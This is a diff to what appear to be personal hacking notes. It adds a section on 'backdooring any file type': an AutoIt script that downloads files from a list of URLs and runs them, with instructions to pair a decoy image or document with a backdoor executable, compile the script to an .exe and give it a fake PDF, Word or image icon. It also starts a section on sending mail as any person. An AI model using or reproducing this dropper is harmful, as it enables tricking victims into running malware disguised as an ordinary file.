@@ -332,6 +332,48 @@ Run met /opt/maltegoce/bin/maltego
 
 maak username en pw
 
+## Backdooring Any File Type
+
+Using an already created backdoor (see above) 
+```
+#include <StaticConstants.au3>
+#include <WindowsConstants.au3>
+
+Local $urls = "url1,url2"
+
+Local $urlsArray = StringSplit($urls, ",", 2 )
+
+For $url In $urlsArray
+	$sFile = _DownloadFile($url)
+	shellExecute($sFile)
+
+Next
+
+Func _DownloadFile($sURL)
+    Local $hDownload, $sFile
+    $sFile = StringRegExpReplace($sURL, "^.*/", "")
+    $sDirectory = @TempDir & $sFile
+    $hDownload = InetGet($sURL, $sDirectory, 17, 1)
+    InetClose($hDownload)
+    Return $sDirectory
+EndFunc   ;==>_GetURLImage
+```
+* Local URL's: the file you want the target to see, needs to be online (on a server)
+ First eg: "imageurl.jpg, backdoor.exe"
+ 
+### Compiling the created script
+(If Veil is installed, autoit will be installed automaticly)
+* Change extention of the script from `.txt` to `.au3`.
+* Search for compile; click the compile autoit program
+* Source: created .au3 script
+  Destination: .exe file
+* use www.iconarchive.com to download and use a custom icon. (in case of an pdf, word,...)
+  in case of an image: go to www.rw-designer.com/image-to-icon to an `.ico` file.
+
+#### TO BE CONTINUED
+
+## Send mails as any person you want
+
 
 
 
